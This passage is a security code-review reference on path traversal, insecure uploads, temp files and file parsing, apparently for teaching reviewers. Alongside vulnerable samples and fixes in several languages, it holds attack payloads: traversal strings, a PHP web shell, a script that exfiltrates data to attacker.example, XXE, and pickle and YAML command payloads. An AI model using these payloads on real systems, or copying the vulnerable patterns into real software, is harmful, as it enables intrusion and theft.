---
title: "4.4 Code Reference — Review Paths, Uploads, and Files"
description: >
  Payloads, sinks, multi-language examples, and fixes for Review Paths, Uploads, and Files.
---

# 4.4 Code Reference — Review Paths, Uploads, and Files

## Path traversal {: #path-traversal }

From former `4-11-review-path-traversal.md`. **Guiding chapter section:** [4.4 - Review Paths, Uploads, and Files § Path traversal](../../4-04-review-paths-uploads-and-files.md#path-traversal).

# 4.11 Code Reference — Review Path Traversal

## Attack Payloads

Use these in authorized tests when a parameter influences filesystem paths. Replace `FILE` with the expected filename parameter (e.g., `document.pdf`).

### Pattern 1: Basic parent-directory traversal

```text
AVATAR=../../../etc/shadow
AVATAR=....//....//var/log/auth.log
AVATAR=..\\..\\..\\windows\\system32\\config\\sam
```

### Pattern 2: URL-encoded and double-encoded sequences

```text
AVATAR=..%2f..%2f..%2fvar%2flog%2fnginx%2faccess.log
AVATAR=..%252f..%252f..%252fetc%252fshadow
AVATAR=%2e%2e%2f%2e%2e%2fetc%2fhostname
```

### Pattern 3: Absolute path bypass

```text
AVATAR=/var/log/app.log
AVATAR=C:\inetpub\logs\LogFiles\W3SVC1\u_ex.log
AVATAR=file:///etc/hosts
```

### Pattern 4: Null byte truncation (legacy)

```text
AVATAR=../../../etc/passwd%00.png
AVATAR=backup.sql%00.jpg
```

### Pattern 5: Archive entry names (zip slip)

```text
../../../../home/deploy/.ssh/authorized_keys
..\\..\\..\\Startup\\malware.bat
```

### Pattern 6: Unicode and normalization bypass

```text
AVATAR=..%c0%af..%c0%afetc/passwd
AVATAR=....\/....\/etc/hosts
AVATAR=..%ef%bc%8f..%ef%bc%8fvar/log/syslog
```

## Language-Specific Sinks and Dangerous APIs

Search for path concatenation without canonicalization and base-directory checks. Any API that opens files from user-influenced strings is a review priority.

### Python

```python
open(f"/var/www/avatars/{user_id}/{filename}")
send_file(os.path.join(AVATAR_ROOT, avatar_name))
Path(log_dir) / request.args.get("name")
shutil.copy(user_path, dest)
tarfile.extractall(user_upload)  # no per-entry validation
```

### Java

```java
new FileInputStream(baseDir + "/" + filename);
Paths.get(uploadRoot, userSuppliedName);
Files.readAllBytes(Paths.get(userPath));
new File(base, URLDecoder.decode(name, "UTF-8"));
```

### C#

```csharp
var path = Path.Combine(baseDir, filename);
File.ReadAllText(path);
File.OpenRead(userSuppliedPath);
context.Response.TransmitFile(base + "\\" + name);
```

### JavaScript (Node.js)

```javascript
fs.readFileSync(path.join(baseDir, req.query.file));
res.sendFile(path.resolve(uploads, filename));
fs.createReadStream(`/data/${req.params.name}`);
```

### Go

```go
http.ServeFile(w, r, filepath.Join(root, r.URL.Query().Get("f")))
ioutil.ReadFile(base + "/" + filename)
os.Open(filepath.Clean(userPath))  // Clean alone is insufficient
```

### Shell

```bash
cat "$UPLOAD_DIR/$filename"
cp "$user_file" /var/www/
unzip "$archive"  # extracts all paths without validation
```

### C

```c
snprintf(path, sizeof(path), "%s/%s", base, user_file);
fopen(path, "r");
open(full_path, O_RDONLY);
```

## Vulnerable Examples in Other Languages

### Java

```java
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String logName = req.getParameter("log");
    String basePath = req.getServletContext().getRealPath("logs");
    Path path = Paths.get(basePath, logName);
    File file = path.toAbsolutePath().toFile();
    if (!file.exists()) {
        resp.setStatus(404);
        return;
    }
    try (InputStream in = new FileInputStream(file)) {
        IOUtils.copy(in, resp.getOutputStream());
    }
}
```

### C#

```csharp
[HttpGet("invoices/{id}/pdf")]
public IActionResult DownloadInvoicePdf(int id, string template)
{
    var path = Path.Combine(_invoiceRoot, id.ToString(), template);
    if (!System.IO.File.Exists(path))
        return NotFound();
    var bytes = System.IO.File.ReadAllBytes(path);
    return File(bytes, "application/pdf", Path.GetFileName(path));
}
```

### Go

```go
func serveAvatar(w http.ResponseWriter, r *http.Request) {
    avatar := r.URL.Query().Get("name")
    uid := r.URL.Query().Get("uid")
    path := filepath.Join("/var/www/avatars", uid, avatar)
    http.ServeFile(w, r, path)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Resolve paths and verify they stay under the upload root. Prefer framework helpers.

```python
from pathlib import Path
from flask import send_from_directory

AVATAR_ROOT = Path("/var/www/avatars").resolve()

@app.route("/avatar")
def serve_avatar():
    avatar = request.args.get("name", "")
    uid = request.args.get("uid", "")
    safe_path = (AVATAR_ROOT / uid / Path(avatar).name).resolve()
    if not safe_path.is_relative_to(AVATAR_ROOT):
        return "Forbidden", 403
    if not safe_path.is_file():
        return "Not found", 404
    return send_from_directory(safe_path.parent, safe_path.name)
```

```python
from werkzeug.security import safe_join

path = safe_join("/var/www/uploads", filename)
if path is None:
    return "Invalid path", 400
```

**Important:** Use opaque stored filenames (UUIDs) on disk. Keep original names in metadata only.

### Java

Normalize and verify the resolved path starts with the base directory.

```java
Path base = Paths.get("/var/www/avatars").toAbsolutePath().normalize();
Path resolved = base.resolve(uid).resolve(Paths.get(avatar).getFileName()).normalize();
if (!resolved.startsWith(base) || !Files.isRegularFile(resolved)) {
    throw new ResponseStatusException(HttpStatus.NOT_FOUND);
}
Files.copy(resolved, response.getOutputStream());
```

**Important:** `Paths.get(base, filename)` alone is insufficient. Always normalize and compare prefix against the trusted root.

### C#

Use `Path.GetFullPath` with a prefix check. Strip directory segments from user input.

```csharp
var safeName = Path.GetFileName(template);
var fullPath = Path.GetFullPath(Path.Combine(_invoiceRoot, id.ToString(), safeName));
if (!fullPath.StartsWith(_invoiceRoot, StringComparison.OrdinalIgnoreCase))
    return Forbid();
if (!System.IO.File.Exists(fullPath))
    return NotFound();
return PhysicalFile(fullPath, "application/pdf", safeName);
```

**Important:** Reject rooted paths. `Path.IsPathRooted(userInput)` should fail for untrusted filenames.

### Go

Clean paths and verify prefix under root. Prefer `http.Dir` or `embed.FS`.

```go
func serveAvatar(w http.ResponseWriter, r *http.Request) {
    name := filepath.Base(r.URL.Query().Get("name"))
    uid := filepath.Base(r.URL.Query().Get("uid"))
    root := filepath.Join("/var/www/avatars", uid)
    clean := filepath.Clean(filepath.Join(root, name))
    if !strings.HasPrefix(clean, root+string(os.PathSeparator)) && clean != root {
        http.Error(w, "forbidden", http.StatusForbidden)
        return
    }
    http.ServeFile(w, r, clean)
}
```

```go
// Zip slip protection:
dest := filepath.Clean(extractRoot)
target := filepath.Clean(filepath.Join(dest, f.Name))
if !strings.HasPrefix(target, dest+string(os.PathSeparator)) {
    return fmt.Errorf("illegal path in archive")
}
```

**Important:** Validate every archive member path before extraction, not only the top-level filename.

## Insecure file path handling {: #file-path }

From former `4-29-review-insecure-file-path-handling.md`. **Guiding chapter section:** [4.4 - Review Paths, Uploads, and Files § Insecure file path handling](../../4-04-review-paths-uploads-and-files.md#file-path).

# 4.29 Code Reference — Review Insecure File Path Handling

## Attack Payloads

Use these in authorized tests against download, avatar, and attachment parameters named `file`, `path`, or `filename`.

### Pattern 1: Classic parent-directory traversal

```text
../../../etc/passwd
..\..\..\windows\win.ini
```

### Pattern 2: URL-encoded and double-encoded sequences

```text
..%2f..%2fetc%2fpasswd
%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd
```

### Pattern 3: Absolute path injection

```text
/etc/passwd
C:\boot.ini
file:///etc/passwd
```

### Pattern 4: Null-byte truncation (legacy stacks)

```text
../../../etc/passwd%00.png
```

### Pattern 5: Symlink under allowed base (abuse scenario)

```bash
# Attacker creates symlink in writable area
ln -s /etc/passwd /var/app/uploads/avatar.png
# Server serves "avatar.png" → reads /etc/passwd
```

### Pattern 6: Identifier resolved to path without confinement

```text
GET /files?id=../../../../secrets/db.yml
```

## Language-Specific Sinks and Dangerous APIs

Search for path joins and file APIs that use user input before canonicalization against a base directory.

### Python

```python
open(os.path.join(UPLOAD_DIR, filename))
Path(base) / user_path
send_file(request.args["path"])
```

`flask.send_from_directory` without `safe_join`; `shutil.copy` with user filenames.

### Java

```java
new FileInputStream(baseDir + "/" + filename);
Paths.get(uploadRoot, userSuppliedName);
Files.readAllBytes(Paths.get(userPath));
```

`ResourceUtils.getFile`, Spring `Resource` handlers, `ServletContext.getResourceAsStream`.

### C#

```csharp
var path = Path.Combine(_base, fileName);
return PhysicalFile(path, "application/octet-stream");
File.ReadAllBytes(userPath);
```

### JavaScript (Node.js)

```javascript
const p = path.join(__dirname, "uploads", req.query.file);
fs.readFileSync(p);
res.sendFile(req.params.name, { root: uploads });
```

### Go

```go
http.ServeFile(w, r, filepath.Join(base, r.URL.Query().Get("f")))
ioutil.ReadFile(path.Join(dir, name))
```

### PHP and legacy

```php
include($_GET['page'] . '.php');
readfile('/var/docs/' . $_GET['doc']);
```

## Vulnerable Examples in Other Languages

### Java

```java
@GetMapping("/download")
public void download(@RequestParam String filename, HttpServletResponse resp)
        throws IOException {
    String basePath = servletContext.getRealPath("/uploads");
    Path path = Paths.get(basePath, filename);
    try (InputStream in = new FileInputStream(path.toFile())) {
        IOUtils.copy(in, resp.getOutputStream());
    }
}

@PostMapping("/avatar")
public void saveAvatar(@RequestParam String name, @RequestBody byte[] data)
        throws IOException {
    Path target = Paths.get("/data/avatars", name);
    Files.write(target, data);
}
```

### C#

```csharp
[HttpGet("files")]
public IActionResult GetFile([FromQuery] string file)
{
    var path = Path.Combine(_uploadRoot, file);
    return PhysicalFile(path, "application/octet-stream");
}

[HttpPost("backup/restore")]
public IActionResult Restore([FromQuery] string archivePath)
{
    var source = Path.Combine(_backupRoot, archivePath);
    ZipFile.ExtractToDirectory(source, _restoreTarget);
    return Ok();
}
```

### Go

```go
func download(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("name")
    http.ServeFile(w, r, filepath.Join("/data/files", name))
}

func saveAttachment(w http.ResponseWriter, r *http.Request) {
    name := r.FormValue("filename")
    data, _ := io.ReadAll(r.Body)
    os.WriteFile(filepath.Join("/var/uploads", name), data, 0644)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Resolve paths and verify they stay under the upload root. Prefer `send_from_directory`.

```python
from pathlib import Path

from fastapi import FastAPI, HTTPException
from fastapi.responses import FileResponse
from werkzeug.utils import secure_filename

app = FastAPI()
AVATAR_ROOT = Path("/var/data/avatars").resolve()

@app.get("/avatars/{name}")
def avatar(name: str):
    safe = secure_filename(name)
    if not safe:
        raise HTTPException(status_code=400)
    target = (AVATAR_ROOT / safe).resolve()
    if not target.is_relative_to(AVATAR_ROOT) or not target.is_file():
        raise HTTPException(status_code=404)
    return FileResponse(target)
```

**Important:** `secure_filename` alone is not enough. Always verify resolved path containment.

### Java

Compare canonical paths after join.

```java
Path base = Paths.get(basePath).toAbsolutePath().normalize();
Path target = base.resolve(filename).normalize();
if (!target.startsWith(base)) {
    throw new SecurityException("path traversal blocked");
}
if (!Files.isRegularFile(target)) {
    throw new FileNotFoundException();
}
Files.copy(target, response.getOutputStream());
```

### C#

Use `Path.GetFullPath` and compare to the upload root.

```csharp
var safeName = Path.GetFileName(name);
var candidate = Path.GetFullPath(Path.Combine(_uploadRoot, safeName));
var root = Path.GetFullPath(_uploadRoot);
if (!candidate.StartsWith(root + Path.DirectorySeparatorChar))
    return Forbid();
return PhysicalFile(candidate, "application/octet-stream");
```

### Go

Use `filepath.Clean` and verify `filepath.Rel` does not escape.

```go
func safePath(base, name string) (string, error) {
    clean := filepath.Clean(name)
    if filepath.IsAbs(clean) || strings.HasPrefix(clean, "..") {
        return "", fmt.Errorf("invalid name")
    }
    full := filepath.Join(base, clean)
    rel, err := filepath.Rel(base, full)
    if err != nil || strings.HasPrefix(rel, "..") {
        return "", fmt.Errorf("path traversal blocked")
    }
    return full, nil
}
```

## Insecure file upload {: #upload }

From former `4-30-review-insecure-file-upload.md`. **Guiding chapter section:** [4.4 - Review Paths, Uploads, and Files § Insecure file upload](../../4-04-review-paths-uploads-and-files.md#upload).

# 4.30 Code Reference — Review Insecure File Upload

## Attack Payloads

Use these in authorized tests on upload endpoints. Abuse scenarios include web shells, stored XSS via SVG/HTML, and quota exhaustion.

### Pattern 1: Web shell under web root (upload abuse scenario)

```text
Filename: shell.php.jpg or shell.jsp
Content: <?php system($_GET['cmd']); ?>
```

Stored under `public/uploads/` and executed by the web server.

### Pattern 2: Double extension and MIME mismatch

```text
report.pdf.exe
image.png  (polyglot with HTML/script)
Content-Type: image/jpeg  (client lie; body is HTML)
```

### Pattern 3: SVG and HTML active content

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

```html
<script>fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://attacker.example/?'+btoa(JSON.stringify(d))))</script>
```

### Pattern 4: Path traversal in original filename

```text
filename=../../../static/evil.js
```

### Pattern 5: Oversized and zip bomb uploads

```text
10GB file or highly compressible blob to exhaust disk/RAM during scan
```

### Pattern 6: Content sniffing bypass

```text
GIF89a<?php ... ?>   # magic bytes + executable payload
```

## Language-Specific Sinks and Dangerous APIs

Search for save paths, extension checks, and download handlers that trust client metadata.

### Python

```python
file.save(os.path.join("static", file.filename))
werkzeug secure_filename omitted
return send_file(upload_path, mimetype=file.content_type)
```

Flask `request.files`; Django `FileField` saved to `MEDIA_ROOT` under web root.

### Java

```java
part.write(uploadDir + File.separator + part.getSubmittedFileName());
Files.copy(stream, Paths.get(publicDir, originalName));
```

Spring `MultipartFile.transferTo`; servlet `Part` without content sniffing.

### C#

```csharp
file.CopyTo(Path.Combine(_webRoot, file.FileName));
return PhysicalFile(path, file.ContentType);
```

`IFormFile` saved with client `FileName`; missing virus scan and size cap before buffer.

### JavaScript (Node.js)

```javascript
const dest = path.join("public", req.file.originalname);
fs.writeFileSync(dest, req.file.buffer);
multer({ dest: "uploads/" })
```

### Go

```go
os.WriteFile(filepath.Join("static", header.Filename), data, 0644)
```

### Object storage

```text
s3.put_object(Key=user_key, ACL='public-read')  # user-controlled key under web bucket
```

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/upload")
public void upload(HttpServletRequest req, HttpServletResponse resp) throws Exception {
    Part part = req.getPart("file");
    String name = part.getSubmittedFileName();
    part.write(getServletContext().getRealPath("/uploads/" + name));
}

@GetMapping("/uploads/{name}")
public void serve(@PathVariable String name, HttpServletResponse resp) throws IOException {
    File file = new File("/var/www/html/uploads/" + name);
    Files.copy(file.toPath(), resp.getOutputStream());
}
```

### C#

```csharp
[HttpPost("upload")]
public async Task<IActionResult> Upload(IFormFile file)
{
    var path = Path.Combine(_env.WebRootPath, "uploads", file.FileName);
    using var stream = new FileStream(path, FileMode.Create);
    await file.CopyToAsync(stream);
    return Ok(new { url = "/uploads/" + file.FileName });
}

[HttpPost("import")]
public async Task<IActionResult> Import(IFormFile file)
{
    if (Path.GetExtension(file.FileName).Equals(".jsp", StringComparison.OrdinalIgnoreCase))
        return BadRequest("JSP not allowed");
    var path = Path.Combine(_uploadRoot, file.FileName);
    await using var fs = new FileStream(path, FileCreate);
    await file.CopyToAsync(fs);
    return Ok();
}
```

### Go

```go
func upload(w http.ResponseWriter, r *http.Request) {
    r.ParseMultipartForm(32 << 20)
    file, header, _ := r.FormFile("file")
    defer file.Close()
    out, _ := os.Create("/var/www/html/uploads/" + header.Filename)
    io.Copy(out, file)
}

func serveUpload(w http.ResponseWriter, r *http.Request) {
    name := mux.Vars(r)["name"]
    http.ServeFile(w, r, filepath.Join("/var/www/html/uploads", name))
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Generate server-side storage keys. Store outside the web root. Verify content with Pillow or magic bytes.

```python
import uuid
from pathlib import Path

from flask import Flask, abort, request
from PIL import Image
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_ROOT = Path("/var/data/uploads")  # not under static/
ALLOWED_EXT = {".png", ".jpg", ".jpeg"}
MAX_BYTES = 5 * 1024 * 1024

@app.route("/upload", methods=["POST"])
def upload():
    f = request.files.get("file")
    if not f:
        abort(400)
    data = f.read(MAX_BYTES + 1)
    if len(data) > MAX_BYTES:
        abort(413)
    ext = Path(secure_filename(f.filename)).suffix.lower()
    if ext not in ALLOWED_EXT:
        abort(400)
    # Re-encode image to strip active content and verify format
    from io import BytesIO
    img = Image.open(BytesIO(data))
    img.verify()
    img = Image.open(BytesIO(data))
    key = f"{uuid.uuid4().hex}{ext}"
    out = UPLOAD_ROOT / key
    img.save(out, format=img.format)
    return {"id": key}
```

**Important:** Serve downloads through an authenticated endpoint with safe headers, not direct static URLs.

### Java

Store as random UUID keys outside the web root. Serve through a controlled servlet.

```java
String original = part.getSubmittedFileName();
String ext = validateExtension(original);
String key = UUID.randomUUID() + ext;
Path dest = uploadRoot.resolve(key); // uploadRoot not under webapp root
try (InputStream in = part.getInputStream()) {
    Files.copy(in, dest, StandardCopyOption.REPLACE_EXISTING);
}
return key;
```

### C#

Validate signature bytes. Store in private blob storage, not `WebRootPath`.

```csharp
public async Task<IActionResult> Upload(IFormFile file)
{
    if (file.Length > MaxBytes) return BadRequest();
    await using var ms = new MemoryStream();
    await file.CopyToAsync(ms);
    if (!IsAllowedImage(ms))
        return BadRequest("Invalid file type");
    var key = $"{Guid.NewGuid():N}.png";
    await _storage.SaveAsync(key, ms.ToArray());
    return Ok(new { id = key });
}
```

### Go

Limit bytes read. Use random hex names. Detect content type from first 512 bytes.

```go
import (
    "bytes"
    "crypto/rand"
    "encoding/hex"
    "io"
    "net/http"
    "os"
    "path/filepath"
    "strings"
)

func upload(w http.ResponseWriter, r *http.Request) {
    r.Body = http.MaxBytesReader(w, r.Body, 5<<20)
    file, header, err := r.FormFile("file")
    if err != nil {
        http.Error(w, "bad request", 400)
        return
    }
    defer file.Close()
    buf := make([]byte, 512)
    n, _ := file.Read(buf)
    ctype := http.DetectContentType(buf[:n])
    if !strings.HasPrefix(ctype, "image/") {
        http.Error(w, "invalid type", 400)
        return
    }
    rnd := make([]byte, 16)
    rand.Read(rnd)
    key := hex.EncodeToString(rnd) + filepath.Ext(header.Filename)
    out, err := os.Create(filepath.Join(uploadRoot, key))
    if err != nil {
        http.Error(w, "server error", 500)
        return
    }
    defer out.Close()
    io.Copy(out, io.MultiReader(bytes.NewReader(buf[:n]), file))
}
```

## Insecure temporary files {: #temp-files }

From former `4-27-review-insecure-temporary-files.md`. **Guiding chapter section:** [4.4 - Review Paths, Uploads, and Files § Insecure temporary files](../../4-04-review-paths-uploads-and-files.md#temp-files).

# 4.27 Code Reference — Review Insecure Temporary Files

## Attack Payloads

Use these in authorized tests on shared hosts or containers with a writable `/tmp`. Abuse scenarios include guessing paths, symlink races, and reading world-readable exports.

### Pattern 1: Predictable path guessing

```text
/tmp/export_12345.csv
/tmp/app_upload_67890.pdf
/var/tmp/report-{pid}.xml
```

Scan with the application's PID or session patterns when filenames are sequential or derived from `os.getpid()`.

### Pattern 2: TOCTOU symlink race (abuse scenario)

```bash
# Attacker on shared host
ln -s /etc/passwd /tmp/export_pending.csv
# App checks exists(), then opens and writes sensitive export
```

### Pattern 3: World-readable sensitive export

```bash
ls -l /tmp/user_export.csv
# -rw-r--r-- 1 app app 50000 ...  → other users can read
```

### Pattern 4: Stale temp files after crash

```text
/tmp/payment_receipt_abc123.pdf  # left for hours with PAN data
```

### Pattern 5: Predictable names in URLs

```text
GET /download?file=/tmp/session_42_export.zip
```

### Pattern 6: Container shared volume

```text
/tmp from host mounted into multiple pods — cross-tenant read if names collide
```

## Language-Specific Sinks and Dangerous APIs

Search for temp file creation without secure random names, `O_EXCL`, or restrictive permissions.

### Python

```python
open(f"/tmp/upload_{user_id}.dat", "w")
tempfile.mktemp(suffix=".csv")  # deprecated — predictable
NamedTemporaryFile(delete=False)  # left on disk without cleanup
os.chmod(path, 0o644)
```

`tempfile.mkstemp` is safer when used with `0600` and prompt `os.unlink`.

### Java

```java
File f = new File("/tmp/export-" + userId + ".xml");
File.createTempFile("report", ".pdf");  // default dir may be world-readable
Files.write(path, data);  // no explicit PosixFilePermissions
```

`File.deleteOnExit()` without guaranteed removal on crash paths.

### C#

```csharp
var path = Path.Combine(Path.GetTempPath(), $"export_{id}.csv");
File.WriteAllText(path, sensitive);
```

`Path.GetTempFileName()` without ACL hardening on Windows.

### JavaScript (Node.js)

```javascript
const p = `/tmp/${req.session.id}.json`;
fs.writeFileSync(p, JSON.stringify(data));
```

### Go

```go
f, _ := os.Create(fmt.Sprintf("/tmp/out_%d", os.Getpid()))
ioutil.WriteFile("/tmp/"+name, data, 0644)
```

### Shell

```bash
echo "$DATA" > /tmp/report.$$
mktemp /tmp/upload.XXXXXX  # wrong if X not used
```

## Vulnerable Examples in Other Languages

### Java

```java
public Path writeExport(String csv) throws IOException {
    File file = new File("/var/app/files/temporary.txt");
    file.createNewFile();
    try (FileWriter w = new FileWriter(file)) {
        w.write(csv);
    }
    return file.toPath();
}

public void stageUpload(byte[] data) throws IOException {
    Path path = Paths.get("/tmp", "upload-" + ProcessHandle.current().pid() + ".bin");
    Files.write(path, data); // predictable name on shared /tmp
}
```

### C#

```csharp
public IActionResult ExportCsv(string csv)
{
    var path = Path.Combine(Path.GetTempPath(), "export-" + DateTime.UtcNow.Ticks + ".csv");
    File.WriteAllText(path, csv);
    return PhysicalFile(path, "text/csv");
}

public async Task SaveDraftAsync(string userId, string content)
{
    var path = Path.Combine(Path.GetTempPath(), $"draft-{userId}.txt");
    await File.WriteAllTextAsync(path, content); // world-readable default on some hosts
}
```

### Shell

```bash
#!/bin/bash
# Predictable path under shared /tmp — other local users can read before delete
REPORT="/tmp/report-$$.txt"
echo "$SECRET_DATA" > "$REPORT"
upload_to_s3 "$REPORT"
rm -f "$REPORT"

# TOCTOU: check then write in separate steps
if [ ! -f /tmp/export.csv ]; then
    echo "$CSV" > /tmp/export.csv
fi
```

### Go

```go
func writeReport(data string) (string, error) {
    path := fmt.Sprintf("/tmp/report-%d.txt", os.Getpid())
    f, err := os.Create(path)
    if err != nil {
        return "", err
    }
    defer f.Close()
    io.WriteString(f, data)
    return path, nil
}

func exportCsv(w http.ResponseWriter, csv string) {
    path := filepath.Join(os.TempDir(), "export.csv")
    os.WriteFile(path, []byte(csv), 0644)
    http.ServeFile(w, &http.Request{}, path)
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use `tempfile` for unpredictable names. Delete in `finally`. Restrict permissions when needed.

```python
import os
import tempfile

def write_report(secret_report: str) -> str:
    fd, path = tempfile.mkstemp(prefix="report_", suffix=".txt")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            os.chmod(path, 0o600)
            f.write(secret_report)
        return path
    except Exception:
        os.close(fd)
        raise
    finally:
        # Caller should delete after use; document ownership
        pass

def process_and_cleanup(secret_report: str) -> None:
    path = write_report(secret_report)
    try:
        upload_to_storage(path)
    finally:
        os.remove(path)
```

**Important:** On multi-tenant hosts, configure a private temp directory per deployment instead of shared `/tmp`.

### Java

Use `Files.createTempFile` with restrictive POSIX permissions. Delete in `finally`.

```java
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.PosixFilePermissions;
import java.util.Set;

Path temp = Files.createTempFile(
    "report-",
    ".txt",
    PosixFilePermissions.asFileAttribute(Set.of(
        PosixFilePermission.OWNER_READ,
        PosixFilePermission.OWNER_WRITE)));
try {
    Files.writeString(temp, secretReport);
    process(temp);
} finally {
    Files.deleteIfExists(temp);
}
```

### C#

Prefer `File.CreateTemp` (.NET 6+) or private app directories with ACL control.

```csharp
var path = Path.GetTempFileName();
try
{
    await File.WriteAllTextAsync(path, csv);
    await UploadAsync(path);
}
finally
{
    File.Delete(path);
}
```

```csharp
// .NET 6+ alternative
string path = Path.GetTempFileName(); // or File.CreateTemp when available
```

### Go

Use `os.CreateTemp`. Set `0600` when defaults are loose. Always `defer os.Remove`.

```go
func writeReport(data string) (string, error) {
    f, err := os.CreateTemp("", "report-*.txt")
    if err != nil {
        return "", err
    }
    path := f.Name()
    _ = f.Chmod(0600)
    if _, err := io.WriteString(f, data); err != nil {
        f.Close()
        os.Remove(path)
        return "", err
    }
    if err := f.Close(); err != nil {
        os.Remove(path)
        return "", err
    }
    return path, nil
}
```

## Insecure file parsing {: #file-parsing }

From former `4-28-review-insecure-file-parsing.md`. **Guiding chapter section:** [4.4 - Review Paths, Uploads, and Files § Insecure file parsing](../../4-04-review-paths-uploads-and-files.md#file-parsing).

# 4.28 Code Reference — Review Insecure File Parsing

## Attack Payloads

Use these in authorized tests with crafted files in upload and import features. Confirm parser limits and safe loader settings per format.

### Pattern 1: Zip Slip path traversal (archive abuse scenario)

```text
# Malicious entry name inside archive
../../../../etc/passwd
..\..\windows\system32\config\sam
```

### Pattern 2: XML external entity (XXE)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Pattern 3: Billion laughs / entity expansion

```xml
<!ENTITY a "aaaa...">
<!ENTITY b "&a;&a;...">
```

### Pattern 4: Unsafe deserialization in file body

```python
# pickle magic bytes in uploaded .dat
cos\nsystem\n(S'whoami'\ntR.
```

### Pattern 5: YAML unsafe load

```yaml
!!python/object/apply:os.system ['id']
```

### Pattern 6: Zip bomb and nested archives

```text
42.zip containing 42.zip × N with huge uncompressed size
```

## Language-Specific Sinks and Dangerous APIs

Search for parsers that enable dangerous features on untrusted input.

### Python

```python
zipfile.ZipFile(path).extractall(dest)  # no path check
yaml.load(data)  # use yaml.safe_load
pickle.load(f)
xml.etree.ElementTree.parse(path)  # XXE risk in some configs
lxml.etree.parse(path)
```

`tarfile.extractall`, `PIL.Image.open` without size limits, `pdfplumber` on hostile PDFs.

### Java

```java
new ObjectInputStream(in).readObject();
DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(in);
ZipInputStream zis; zis.getNextEntry(); Files.copy(..., Paths.get(dest, entry.getName()));
```

`XMLInputFactory` without `ACCESS_EXTERNAL_DTD` disabled; Apache POI on macro-enabled Office files.

### C#

```csharp
BinaryFormatter.Deserialize(stream);
new XmlDocument().Load(path);
ZipFile.ExtractToDirectory(archive, dest);
```

### JavaScript

```javascript
const zip = await JSZip.loadAsync(buffer);
zip.file(entry.name).async("uint8array");  // entry.name may contain ../
yaml.load(str);
```

### Go

```go
archive/zip.OpenReader(path)  // extract without filepath.Clean check
xml.Unmarshal(data, &v)  // verify decoder limits
```

### C / native

```c
unzip(file, dest_dir);  // no canonical path check
```

## Vulnerable Examples in Other Languages

### Java

```java
public void importArchive(InputStream in) throws Exception {
    try (ZipInputStream zis = new ZipInputStream(in)) {
        ZipEntry entry;
        while ((entry = zis.getNextEntry()) != null) {
            Path out = Paths.get("/var/import", entry.getName());
            Files.copy(zis, out, StandardCopyOption.REPLACE_EXISTING);
        }
    }
}

public Config loadConfig(byte[] yamlBytes) {
    Yaml yaml = new Yaml(); // unsafe constructor — arbitrary object construction
    return yaml.load(new String(yamlBytes));
}
```

### C#

```csharp
public object LoadSession(byte[] blob)
{
    var formatter = new BinaryFormatter();
    using var ms = new MemoryStream(blob);
    return formatter.Deserialize(ms);
}

public void ImportXml(Stream upload)
{
    var doc = new XmlDocument();
    doc.XmlResolver = new XmlUrlResolver(); // XXE via external entities
    doc.Load(upload);
}
```

### Go

```go
func parseUpload(r io.Reader) error {
    dec := xml.NewDecoder(r)
    dec.Strict = false
    var doc any
    return dec.Decode(&doc)
}

func importArchive(path string) error {
    r, err := zip.OpenReader(path)
    if err != nil {
        return err
    }
    defer r.Close()
    for _, f := range r.File {
        target := filepath.Join("/var/import", f.Name)
        out, _ := os.Create(target) // zip slip — no containment check
        rc, _ := f.Open()
        io.Copy(out, rc)
    }
    return nil
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use `yaml.safe_load`. Validate archive member paths. Prefer JSON for config interchange.

```python
import zipfile
from pathlib import Path

import yaml
from flask import Flask, abort, request

app = Flask(__name__)
IMPORT_ROOT = Path("/var/import").resolve()

def safe_extract(zf: zipfile.ZipFile, dest: Path) -> None:
    dest = dest.resolve()
    for member in zf.infolist():
        target = (dest / member.filename).resolve()
        if not target.is_relative_to(dest):
            raise ValueError("zip slip detected")
        zf.extract(member, dest)

@app.post("/import")
def import_config():
    data = request.files["file"].read()
    config = yaml.safe_load(data)
    if not isinstance(config, dict):
        abort(400)
    return {"keys": list(config.keys())}
```

```python
# XML when required — use defusedxml
from defusedxml import ElementTree as ET

tree = ET.fromstring(untrusted_xml_bytes)
```

**Important:** Never call `pickle.load` on upload bytes. Reject pickle magic regardless of extension.

### Java

Validate Zip Slip paths. Disable DTD and external entities in XML parsers.

```java
private void safeExtract(ZipInputStream zis, Path destDir) throws IOException {
    Path dest = destDir.toAbsolutePath().normalize();
    ZipEntry entry;
    while ((entry = zis.getNextEntry()) != null) {
        Path target = dest.resolve(entry.getName()).normalize();
        if (!target.startsWith(dest)) {
            throw new IOException("zip slip detected");
        }
        Files.copy(zis, target, StandardCopyOption.REPLACE_EXISTING);
    }
}
```

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

### C#

Avoid `BinaryFormatter`. Use `System.Text.Json` for known DTOs. Prohibit DTD in XML.

```csharp
public ConfigDto LoadConfig(string json)
{
    return JsonSerializer.Deserialize<ConfigDto>(json)
        ?? throw new JsonException("Invalid config");
}
```

```csharp
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
using var reader = XmlReader.Create(stream, settings);
```

### Go

Reject archive entries with `..` or absolute paths. Limit upload size before parse.

```go
func safeExtract(r io.Reader, dest string) error {
    data, err := io.ReadAll(io.LimitReader(r, 10<<20))
    if err != nil {
        return err
    }
    destAbs, err := filepath.Abs(dest)
    if err != nil {
        return err
    }
